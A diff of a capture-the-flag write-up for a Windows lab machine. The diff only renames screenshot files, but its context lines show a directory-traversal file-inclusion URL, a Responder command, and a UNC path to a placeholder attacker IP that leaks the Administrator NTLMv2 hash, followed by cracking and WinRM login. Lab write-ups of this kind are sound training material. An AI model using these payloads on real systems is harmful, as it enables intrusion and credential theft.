@@ -44,7 +44,7 @@
 
 Pinged the target to confirm it was alive. TTL value of **127** confirms a **Windows** machine — Linux TTL is 64, Windows TTL is 128, slightly decremented due to routing hops.
 
-![Ping Result](screenshots/01-ping.png)
+![Ping Result](screenshots/ping.png)
 
 ---
 
@@ -52,7 +52,7 @@ Pinged the target to confirm it was alive. TTL value of **127** confirms a **Win
 
 Ran an Nmap service and script scan. Two ports found open — **port 80** running Apache with **PHP 8.1.1**, and **port 5985** running WinRM which will be useful later for remote access.
 
-![Nmap Scan](screenshots/02-nmap.png)
+![Nmap Scan](screenshots/nmap.png)
 
 ---
 
@@ -62,11 +62,11 @@ Ran an Nmap service and script scan. Two ports found open — **port 80** runnin
 
 The web application redirected to `unika.htb` which wasn't resolving. Added it to `/etc/hosts` to fix DNS resolution locally.
 
-![Hosts File](screenshots/03-hosts.png)
+![Hosts File](screenshots/hosts.png)
 
 After saving, the website loaded successfully — a web design company called **UNIKA**.
 
-![Website Loaded](screenshots/04-website.png)
+![Website Loaded](screenshots/website.png)
 
 ---
 
@@ -74,7 +74,7 @@ After saving, the website loaded successfully — a web design company called **
 
 The navigation bar has a language selector — **EN**, **FR**, **DE**. Clicking **DE** changed the URL to `index.php?page=german.html`. The `page` parameter loads files directly, which is immediately suspicious.
 
-![Language Parameter](screenshots/05-language-parameter.png)
+![Language Parameter](screenshots/language-parameter.png)
 
 ---
 
@@ -86,7 +86,7 @@ Tested the `page` parameter by reading the Windows hosts file using directory tr
 http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
 ```
 
-![LFI Confirmed](screenshots/06-lfi.png)
+![LFI Confirmed](screenshots/lfi.png)
 
 ---
 
@@ -100,7 +100,7 @@ Checked the tun0 interface IP first, then started Responder listening on tun0. W
 sudo responder -I tun0 -wF
 ```
 
-![Responder Listening](screenshots/07-responder-listening.png)
+![Responder Listening](screenshots/responder-listening.png)
 
 ---
 
@@ -114,7 +114,7 @@ http://unika.htb/index.php?page=//YOUR_TUN0_IP/sharefilehtb
 
 The server tried to access our fake SMB share and sent the Administrator NTLMv2 hash directly to Responder.
 
-![Hash Captured](screenshots/08-hash-captured.png)
+![Hash Captured](screenshots/hash-captured.png)
 
 **Why this works:** Windows falls back to LLMNR when DNS fails to resolve a hostname. Responder intercepts that broadcast, responds "I'm here", and the victim authenticates to us — sending the NTLMv2 hash in the process.
 
@@ -126,7 +126,7 @@ The server tried to access our fake SMB share and sent the Administrator NTLMv2 
 
 Saved the captured hash to a file and ran John the Ripper against the rockyou wordlist.
 
-![John Cracked](screenshots/09-john-cracked.png)
+![John Cracked](screenshots/john-cracked.png)
 
 **Result: Administrator password = `badminton`**
 
@@ -138,7 +138,7 @@ Saved the captured hash to a file and ran John the Ripper against the rockyou wo
 
 Port 5985 (WinRM) was open from our Nmap scan. Used the cracked credentials to get a full PowerShell session.
 
-![Evil-WinRM Session](screenshots/10-evil-winrm.png)
+![Evil-WinRM Session](screenshots/evil-winrm.png)
 
 ---
 
@@ -148,7 +148,7 @@ Port 5985 (WinRM) was open from our Nmap scan. Used the cracked credentials to g
 
 Explored the Users directory and found two users — Administrator and **mike**. Navigated to mike's desktop and found the flag.
 
-![Flag Found](screenshots/11-flag.png)
+![Flag Found](screenshots/flag.png)
 
 ---
 
